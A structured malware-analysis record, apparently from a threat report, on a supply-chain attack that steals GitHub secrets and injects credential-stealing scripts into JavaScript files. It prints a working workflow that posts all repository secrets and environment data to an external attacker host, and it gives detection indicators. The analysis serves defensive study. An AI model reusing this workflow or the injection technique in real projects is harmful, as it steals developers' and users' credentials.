package_info.package_name: Unknown (malicious package used for GitHub PAT exfiltration)
package_info.package_manager: Unknown (likely npm or PyPI, not specified)
package_info.why_malicious: The package is designed to exfiltrate GitHub personal access tokens (PATs) and repository secrets from developer environments and CI/CD pipelines, enabling attackers to compromise GitHub accounts, inject malicious code into repositories, and steal end-user credentials through supply chain attacks.

malicious_snippets.code_snippet:
name: hook
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Exfiltrate secrets
        run: |
          curl -X POST -d "${{ secrets }} ${{ github }} ${{ env }}" hxxps://send[.]wagateway.pro/webhook
malicious_snippets.code_behavior: On every push event in the CI/CD pipeline, the workflow executes a shell command that collects all GitHub secrets, environment variables, and context, then sends this data via HTTP POST to an external command-and-control server, resulting in exfiltration of sensitive repository credentials.

malice_analysis.why_suspicious: The workflow is explicitly crafted to collect and exfiltrate all available secrets and environment variables to an external, attacker-controlled server, which is never a legitimate use of CI/CD workflows.
malice_analysis.violated_expectations: Standard GitHub Actions workflows are intended to automate build, test, or deployment tasks, not to transmit secrets or environment variables to untrusted external domains. This workflow's sole purpose is malicious exfiltration.
malice_analysis.similar_legitimate_use: Legitimate workflows may send build status or logs to trusted external services, but never transmit secrets or environment variables in bulk, especially not to untrusted or unknown domains.
key_indicators: Workflow triggers on every push event
Bulk exfiltration of all secrets and environment variables
Use of curl to POST sensitive data externally
Destination is a non-corporate, attacker-controlled domain (wagateway.pro)
No legitimate build, test, or deployment steps present

execution_context.trigger: runtime (browser execution of modified JavaScript files)
execution_context.file_location: Appended to all *.js files in compromised repositories

malicious_snippets.code_behavior: At runtime in the browser, the appended code dynamically creates a script element, sets its source to a remote attacker-controlled script, and injects it into the page's DOM, resulting in the execution of further malicious code from the attacker's server.

malice_analysis.why_suspicious: The code is appended to every JavaScript file and is designed to silently load and execute a remote script from an untrusted domain, a classic supply chain attack technique that enables further compromise of end-users.
malice_analysis.violated_expectations: Normal JavaScript files should not inject remote scripts from untrusted or unknown domains, especially not in all files across a codebase. Such behavior is highly indicative of malicious tampering.
malice_analysis.similar_legitimate_use: Dynamic script loading is used for analytics or feature toggles, but only from trusted, vetted domains and never as a blanket modification to all JavaScript files.
key_indicators: Obfuscated, single-line script injection appended to all JavaScript files
No legitimate functional purpose for the injection
Dynamic modification of the DOM to execute external code

execution_context.trigger: runtime (browser, after snippet_2 loads remote script)

malicious_snippets.code_snippet:
// (Not shown in report, but described)
// Code intercepts web-based password forms and exfiltrates credentials to hxxps://send[.]wagateway.pro/webhook
malicious_snippets.code_behavior: At runtime in the browser, the remotely loaded script attaches event listeners to password form submissions, captures user-entered credentials, and sends them via HTTP POST to the attacker's command-and-control server, resulting in theft of end-user credentials.

malice_analysis.why_suspicious: Intercepting password form submissions and exfiltrating credentials to an external server is a direct credential theft technique, commonly used in web-based attacks.
malice_analysis.violated_expectations: Legitimate scripts should never capture and transmit user credentials to untrusted domains. Such interception is a clear violation of user privacy and security.
malice_analysis.similar_legitimate_use: Password managers or security tools may interact with forms, but never exfiltrate credentials to untrusted or unknown domains.
key_indicators: Intercepts password form submissions in the browser
Sends captured credentials to external C2 server (wagateway.pro)
Script is loaded dynamically from an attacker-controlled domain
No user notification or consent for credential capture

behavioral_signatures: GitHub Actions workflows that POST secrets or environment variables to external, non-corporate domains
JavaScript files with appended, obfuscated script injection lines that load remote code from untrusted domains
Dynamic loading of scripts from newly registered or untrusted domains such as wagateway.pro
Browser scripts that attach event listeners to password forms and POST captured credentials externally
file_indicators: .github/workflows/hook.yml containing curl POST to external domain
JavaScript files with appended: var s=document.createElement('script');s.src=... referencing wagateway.pro
References to wagateway.pro in code, workflow files, or build artifacts
detection_knowledge.how_to_detect: Monitor for new or modified GitHub Actions workflows that transmit secrets or environment variables to external domains. Scan JavaScript files for appended script injection lines referencing untrusted domains such as wagateway.pro. Detect network requests from CI/CD environments or browsers to wagateway.pro endpoints. Alert on browser scripts that attach to password forms and POST data externally. Correlate file modifications, workflow changes, and network activity for comprehensive detection.
